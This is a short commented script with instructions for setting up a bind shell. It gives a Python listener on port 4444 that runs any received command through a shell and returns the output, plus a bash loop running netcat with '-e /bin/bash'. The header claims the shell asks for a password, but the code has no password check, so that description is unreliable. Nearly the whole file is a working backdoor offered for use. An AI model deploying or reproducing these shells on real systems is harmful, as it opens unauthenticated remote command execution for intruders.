# this script created a bind shell in the system


# create the bind shell using python which asks for a password
# and then executes the command

# create a file called bindshell.py
# and add the following code to it

# import socket,subprocess,os
# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# s.bind(("0.0.0.0",4444))
# s.listen(1)
# conn,addr=s.accept()
# print '[+] We got a connection from',addr
# while 1:
#     data=conn.recv(1024)
#     if data == "terminate":
#         conn.send('terminate')
#         break
#     else:
#         CMD=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
#         conn.send(CMD.stdout.read())
#         conn.send(CMD.stderr.read())
# conn.close()

# now we need to create a file called bindshell.sh
# and add the following code to it

# #!/bin/bash
# while true; do
#     nc -lvp 4444 -e /bin/bash
# done

# now we need to make the bindshell.sh executable
# chmod +x bindshell.sh
